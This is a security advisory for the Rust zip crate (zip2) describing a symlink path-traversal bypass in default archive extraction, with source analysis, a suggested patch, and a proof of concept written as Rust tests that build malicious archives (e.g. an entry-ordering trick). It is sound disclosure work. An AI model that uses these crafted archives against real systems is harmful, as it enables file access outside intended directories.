---
lang: en
title: With the default SymlinkExtractAction::ExtractRecursiveInFolder (since v9.0.0), symlinks pointing outside the extraction directory are still created
project: zip-rs/zip2
cwe:
  - CWE-22
  - CWE-59
severity: medium
cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
score: "6.5"
verified: b5326b2b42a19f6b5e861e3c726ac58eead521c7
affected: ">= v9.0.0"
patched: v9.0.2
date: 2026-10-11
---

> [!info]
> この脆弱性は `v9.0.2` で修正されました．
>
> - [Merge commit from fork · zip-rs/zip2@7fc4490 · GitHub](https://github.com/zip-rs/zip2/commit/7fc44906564a5d8c5ca9de70a1f19d885e31d062)
> - [With the default SymlinkExtractAction::ExtractRecursiveInFolder (since v9.0.0), symlinks pointing outside the extraction directory are still created · Advisory · zip-rs/zip2 · GitHub](https://github.com/zip-rs/zip2/security/advisories/GHSA-x2x8-gq67-9mq6)

### Summary

- **Verified version:** v9.0.1 `master HEAD: b5326b2b42a19f6b5e861e3c726ac58eead521c7`
- **Affected versions:** v9.0.0, v9.0.1
- **Related:**
  - [GHSA-4v9h-p7m9-rh26](https://github.com/zip-rs/zip2/security/advisories/GHSA-4v9h-p7m9-rh26)
- **Precondition:** Only relative targets are affected; absolute-path targets are rejected by `strip_base_prefix()`.

With the default configuration (`ExtractRecursiveInFolder`) of `ZipArchive::extract()` / `ZipArchive::extract_unwrapped_root_dir()`, this defense can be bypassed, and a symlink originating from the archive is created pointing **outside the extraction directory**.

Both the PoC of GHSA-4v9h-p7m9-rh26 (an absolute-path target) and the regression test recommended by that advisory (`../outside`) use targets that **already exist**.
In that case `canonicalize()` succeeds, so they are still correctly rejected and the existing regression tests pass.
Therefore this issue is not detected by those tests.

Note that the path by which a later entry in the same archive would write outside through that symlink is correctly rejected by `safe_prepare_path() -> resolve_enclosed()`.

Furthermore, the defense in `09c030eab56e8db8fb3c1c33f554407b30bad8fa` itself can also be bypassed by exploiting entry ordering (Details 3).

---

### Details

---

#### `ExtractRecursiveInFolder` does not go through `resolve_enclosed`

**`src/read/extract.rs: make_symlink()` (L153-196):**

```rust
//...
    // ExtractNoRestrictions is allowed outside (no restrictions) - but it uses
    // [`make_symlink_impl`] directly
    // ExtractRecursiveInFolder is allowed outside (it will be checked that the symlink fall in the
    // folder)
    #[cfg(any(windows, unix))]
    let allow_outside = matches!(
        symlink_action,
        SymlinkExtractAction::ExtractNoRestrictions
            | SymlinkExtractAction::ExtractRecursiveInFolder
    );
    #[cfg(not(any(windows, unix)))]
    let allow_outside = false;
    if allow_outside {
        // For ExtractRecursiveInFolder: the literal path may leave `base` (e.g.
        // `../sibling`), but it must canonicalize (following real filesystem symlinks) back into `base`.
        #[cfg(any(unix, windows))]
        if matches!(
            symlink_action,
            SymlinkExtractAction::ExtractRecursiveInFolder
        ) {
            // Try to canonicalize the resolved path so that symlinks in the filesystem
            // that point back inside `base` are followed.
            let abs_to_canonicalize = if target_path.is_absolute() {
                target_path
            } else {
                &base.join(target_path)
            };
            let canonical = if let Ok(p) = std::fs::canonicalize(abs_to_canonicalize) {
                p
            } else {
                abs_to_canonicalize.to_path_buf()
            };
            if !canonical.starts_with(base) {
                return Err(invalid!("Path escapes the destination directory"));
            }
        }
    } else {
        crate::path::resolve_enclosed(
            base,
            start,
            rest.components().map(|c| c.as_os_str().to_os_string()),
            false, // only checking here, so nothing is created
        )?;
    }
//...
```

`ExtractRecursiveInFolder` is the default (`#[default]` at `src/read/extract.rs: L29-32`), and **`extract()` (L310-316)** and **`extract_unwrapped_root_dir()` (L384-390)** pass `ExtractOptions::default()`.

Therefore the default extraction always takes the `if allow_outside` branch above, and the `resolve_enclosed` in the `else` branch is never called.
This branch has the following three problems.

#### 1. On `canonicalize` failure, an un-normalized path is compared lexically

`std::fs::canonicalize` returns an error when any intermediate or final component of the path does not exist.
In that case, the code compares the un-normalized `abs_to_canonicalize` directly with `starts_with(base)`.

`Path::starts_with` is a component-wise lexical comparison and does not interpret `..`.
For a relative target, `abs_to_canonicalize = base.join(target_path)`, so even if `target_path` contains `..`, it **always lexically starts with `base`** and thus passes the check.

As a result, a relative target whose resolved path does not exist is accepted regardless of its contents.

#### 2. A relative target is evaluated against `base` instead of the symlink's parent

The OS resolves a relative target relative to the **parent directory of the symlink itself**.
In the first half of **`make_symlink()` (L123-151)**, the origin `start` of a relative target is likewise computed as `outpath.parent()`.
However, the check uses `base.join(target_path)` and does not use `start`.

Therefore, for a symlink inside a subdirectory, the path being checked does not match the actual resolved path.

#### 3. Bypass via entry ordering (a problem in `resolve_enclosed()` itself)

Separately from **1** and **2**, `resolve_enclosed()` also has a problem that allows creating a symlink pointing outside the extraction directory by exploiting entry ordering.
Therefore, merely fixing **1** and **2** so that `resolve_enclosed()` is used is not enough to prevent the creation of a symlink pointing outside the extraction directory.

**`src/path.rs: resolve_enclosed()` (L181-203):**

```rust
//...
        if component == OsStr::new("..") {
            // Never walk above `base`: `..` is rejected once we are back at `base`.
            if current == base {
                return Err(invalid!(
                    "Path escapes the destination directory - component is '..'"
                ));
            }
            current.pop();
            continue;
        }

        current.push(&component);

        let meta = match fs::symlink_metadata(&current) {
            Ok(meta) => meta,
            // Nothing to follow here, so keep walking; this is also what allows a
            // symlink whose target does not exist (yet) to be accepted.
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                if create_dirs && !queue.is_empty() {
                    make_writable_dir_all(&current)?;
                }
                continue;
            }
        }
//...
```

When a `..` immediately follows a non-existent component, `resolve_enclosed()` cancels it lexically with `current.pop()`.
However, that component can be created as a symlink by a later entry in the same archive.
Since the OS resolves `x/..` to the parent of `x`'s resolved target, the resolved path at check time no longer matches the actual resolved path.

As an example, consider an archive that stores two symlinks in the following order:

1. `l -> x/../outside`: at this point `x` does not exist, so `x/..` is cancelled lexically and it is accepted as `<dest>/outside` (inside the extraction directory).
2. `x -> .`: `x` resolves to `<dest>` itself, so it is accepted.

After extraction, the OS resolves `l` as `<dest>/x/../outside` -> `<dest>/../outside` -> `<parent of dest>/outside`, so `l` points outside the extraction directory.

In this case too, the path by which a later entry in the same archive would write through `l` is rejected by `safe_prepare_path()`.

---

#### Root Cause

In `2a87f64fbe10a7e0a3a51a89fedf9b9c77f3c951`, an `allow_outside` argument was added to `resolve_enclosed()`, which allowed escaping above `base` via `..` when using `ExtractRecursiveInFolder`.
In `a72b210475f1612651b98364b45c612561b5c96b` this argument was removed, but for `ExtractRecursiveInFolder` the check was replaced with one based on `canonicalize()` and a lexical comparison rather than calling `resolve_enclosed()`, so **1** and **2** in [Details](#details) remain.

The regression tests in `tests/extract_symlink.rs` (such as `test_cannot_create_symlink_pointing_outside_destination`) use only targets that already exist, so this regression was not detected.

---

### PoC

The PoC is provided below as unit tests.
You can verify it by placing this PoC at `tests/poc_linux.rs` and running `cargo test --test poc_linux -- --nocapture`.

- `dangling_outward_symlink_is_created()`: with a target whose resolved path does not exist (`../outside/missing`), a symlink pointing outside the extraction directory is created
- `subdir_symlink_to_existing_outside_dir_is_created()`: a symlink inside a subdirectory resolves to an existing directory outside the extraction destination
- `extract_unwrapped_root_dir_is_affected()`: the same applies to `extract_unwrapped_root_dir`
- `ordering_bypass_default()`: via entry ordering (`l -> x/../outside` followed by `x -> .`), a symlink pointing outside the extraction directory is created under the default configuration ([Details 3](#Details))
- `ordering_bypass_extract_in_folder()`: the same applies to `ExtractInFolder`, which is checked with `resolve_enclosed()`

`tests/poc_linux.rs`

```rust
//! Linux PoC:
//! The default `SymlinkExtractAction::ExtractRecursiveInFolder` creates symlinks
//! that point outside the extraction directory
//!
//! - author: sl91994
//!
//! Run:
//! `cargo test --test poc_linux -- --nocapture`

#![cfg(unix)]

use std::fs;
use std::io::Cursor;
use std::path::{Path, PathBuf};
use tempfile::TempDir;
use zip::read::{ExtractOptions, SymlinkExtractAction, root_dir_common_filter};
use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipArchive, ZipWriter};

/// Create `<tmp>/dest` (extraction destination) and `<tmp>/outside` (outside the extraction destination)
fn setup() -> (TempDir, PathBuf, PathBuf) {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let dest = root.join("dest");
    let outside = root.join("outside");
    fs::create_dir(&dest).unwrap();
    fs::create_dir(&outside).unwrap();
    (tmp, dest, outside)
}

/// Create a ZIP file containing only symlinks
fn archive(links: &[(&str, &str)]) -> ZipArchive<Cursor<Vec<u8>>> {
    let opt = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    for (name, target) in links {
        zip.add_symlink(*name, *target, opt).unwrap();
    }
    zip.finish_into_readable().unwrap()
}

/// The actual path to which the symlink resolves (resolved relative to the parent of the symlink, just like in the OS)
fn resolve(link: &Path) -> Option<PathBuf> {
    let target = fs::read_link(link).ok()?;
    link.parent().unwrap().join(target).canonicalize().ok()
}

/// Non-existent target: A dangling symlink pointing outside the extraction directory is created
#[test]
fn dangling_outward_symlink_is_created() {
    let (_tmp, dest, _outside) = setup();

    let res = archive(&[("l", "../outside/missing")]).extract(&dest);
    println!("extract() returned: {res:?}");
    res.unwrap();

    let link = dest.join("l");
    let target = fs::read_link(&link).unwrap();
    println!("{} -> {:?}", link.display(), target);
    assert_eq!(target, Path::new("../outside/missing"));
}

/// Symlinks in subdirectories: Symlinks pointing to directories outside the existing extraction destination are created.
#[test]
fn subdir_symlink_to_existing_outside_dir_is_created() {
    let (_tmp, dest, outside) = setup();

    let res = archive(&[("a/b/c/l", "../../../../outside")]).extract(&dest);
    println!("extract() returned: {res:?}");
    res.unwrap();

    let link = dest.join("a/b/c/l");
    let resolved = resolve(&link);
    println!("{} resolves to {:?}", link.display(), resolved);
    assert_eq!(resolved.as_deref(), Some(outside.as_path()));
}

/// Since `extract_unwrapped_root_dir` also uses the default options, the same applies.
#[test]
fn extract_unwrapped_root_dir_is_affected() {
    let (_tmp, dest, outside) = setup();

    let res = archive(&[("root/a/b/c/l", "../../../../outside")])
        .extract_unwrapped_root_dir(&dest, root_dir_common_filter);
    println!("extract_unwrapped_root_dir() returned: {res:?}");
    res.unwrap();

    let link = dest.join("a/b/c/l");
    let resolved = resolve(&link);
    println!("{} resolves to {:?}", link.display(), resolved);
    assert_eq!(resolved.as_deref(), Some(outside.as_path()));
}

/// Ordering bypass: `l -> x/../outside` is checked while `x` does not exist yet, so `x/..` is
/// cancelled lexically. A later entry then creates `x -> .`, and the OS resolves `x/..` to the
/// parent of the extraction directory.
fn ordering_bypass(options: Option<ExtractOptions>) {
    let (_tmp, dest, outside) = setup();

    let mut zip = archive(&[("l", "x/../outside"), ("x", ".")]);
    let res = match options {
        None => zip.extract(&dest),
        Some(options) => zip.extract_with_options(&dest, options),
    };
    println!("extract() returned: {res:?}");
    res.unwrap();

    let link = dest.join("l");
    let resolved = fs::canonicalize(&link).ok();
    println!("{} resolves to {:?}", link.display(), resolved);
    assert_eq!(resolved.as_deref(), Some(outside.as_path()));
}

/// The default `ExtractRecursiveInFolder` is affected by the ordering bypass.
#[test]
fn ordering_bypass_default() {
    ordering_bypass(None);
}

/// `ExtractInFolder`, which still checks with `resolve_enclosed`, is also affected.
#[test]
fn ordering_bypass_extract_in_folder() {
    ordering_bypass(Some(
        ExtractOptions::default().symlink_action(SymlinkExtractAction::ExtractInFolder),
    ));
}
```

**PoC run output**

```shell
$ cargo test --test poc_linux -- --nocapture --test-threads=1
#...
running 5 tests
test dangling_outward_symlink_is_created ... extract() returned: Ok(())
/tmp/.tmpO3VyJm/dest/l -> "../outside/missing"
ok
test extract_unwrapped_root_dir_is_affected ... extract_unwrapped_root_dir() returned: Ok(())
/tmp/.tmpbczyrV/dest/a/b/c/l resolves to Some("/tmp/.tmpbczyrV/outside")
ok
test ordering_bypass_default ... extract() returned: Ok(())
/tmp/.tmpnuOQnx/dest/l resolves to Some("/tmp/.tmpnuOQnx/outside")
ok
test ordering_bypass_extract_in_folder ... extract() returned: Ok(())
/tmp/.tmp1YQjM1/dest/l resolves to Some("/tmp/.tmp1YQjM1/outside")
ok
test subdir_symlink_to_existing_outside_dir_is_created ... extract() returned: Ok(())
/tmp/.tmpSfppcW/dest/a/b/c/l resolves to Some("/tmp/.tmpSfppcW/outside")
ok

test result: ok. 5 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.01s
```

---

### Impact

When an untrusted ZIP is extracted with the default configuration of `ZipArchive::extract` / `ZipArchive::extract_unwrapped_root_dir`, a **symlink pointing outside the extraction directory is created inside the extraction directory**.
This holds whether the symlink's resolved target is an existing file/directory outside the extraction directory or a non-existent path.

The crate alone does not make writing outside the extraction directory (etc.) possible; the applications affected are those that, **after extraction, write to files inside the extraction directory, or read files inside the extraction directory and expose them externally**.

Because GHSA-4v9h-p7m9-rh26 lists `9.0.0` as the fixed version, users who referred to that advisory and updated to `9.0.0` or later remain affected.

---

### Suggested Fix

While preserving the intent of `ExtractRecursiveInFolder` (**allow a symlink if its final resolved target, after following existing symlinks, is inside the extraction directory**), the following three points are fixed:

1. Canonicalize a relative target relative to `start` (the symlink's parent).
2. When `canonicalize()` fails, do not compare lexically; check with `resolve_enclosed()` instead.
3. In `resolve_enclosed()`, reject a `..` that appears after a component that does not exist (and is not created).

**3** addresses the fact that a component that does not exist at check time may be created as a symlink by a later entry, so a subsequent `..` cannot be cancelled lexically ([Details 3](#details)).

Note that this proposed fix has only been verified on Linux; its behavior on Windows is unverified.

```diff
diff --git a/src/path.rs b/src/path.rs
index 147d9bc9..18ce9cd8 100644
--- a/src/path.rs
+++ b/src/path.rs
@@ -173,12 +173,20 @@ pub(crate) fn resolve_enclosed(
     let mut current = start.to_path_buf();
     let mut queue: VecDeque<OsString> = components.into_iter().collect();
     let mut hops = 0usize;
+    // Set once a component does not exist (and is not created). A later entry may still
+    // create it as a symlink, so a `..` after it cannot be resolved lexically.
+    let mut missing = false;

     while let Some(component) = queue.pop_front() {
         if component.is_empty() || component == OsStr::new(".") {
             continue;
         }
         if component == OsStr::new("..") {
+            if missing {
+                return Err(invalid!(
+                    "Path escapes the destination directory - '..' after a missing component"
+                ));
+            }
             // Never walk above `base`: `..` is rejected once we are back at `base`.
             if current == base {
                 return Err(invalid!(
@@ -198,6 +206,8 @@ pub(crate) fn resolve_enclosed(
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                 if create_dirs && !queue.is_empty() {
                     make_writable_dir_all(&current)?;
+                } else {
+                    missing = true;
                 }
                 continue;
             }
diff --git a/src/read/extract.rs b/src/read/extract.rs
index 91b920ab..4678126b 100644
--- a/src/read/extract.rs
+++ b/src/read/extract.rs
@@ -175,15 +175,22 @@ pub(crate) fn make_symlink<T>(
             let abs_to_canonicalize = if target_path.is_absolute() {
                 target_path
             } else {
-                &base.join(target_path)
+                &start.join(target_path)
             };
-            let canonical = if let Ok(p) = std::fs::canonicalize(abs_to_canonicalize) {
-                p
-            } else {
-                abs_to_canonicalize.to_path_buf()
-            };
-            if !canonical.starts_with(base) {
-                return Err(invalid!("Path escapes the destination directory"));
+            match std::fs::canonicalize(abs_to_canonicalize) {
+                Ok(canonical) => {
+                    if !canonical.starts_with(base) {
+                        return Err(invalid!("Path escapes the destination directory"));
+                    }
+                }
+                Err(_) => {
+                    crate::path::resolve_enclosed(
+                        base,
+                        start,
+                        rest.components().map(|c| c.as_os_str().to_os_string()),
+                        false,
+                    )?;
+                }
             }
         }
     } else {
```
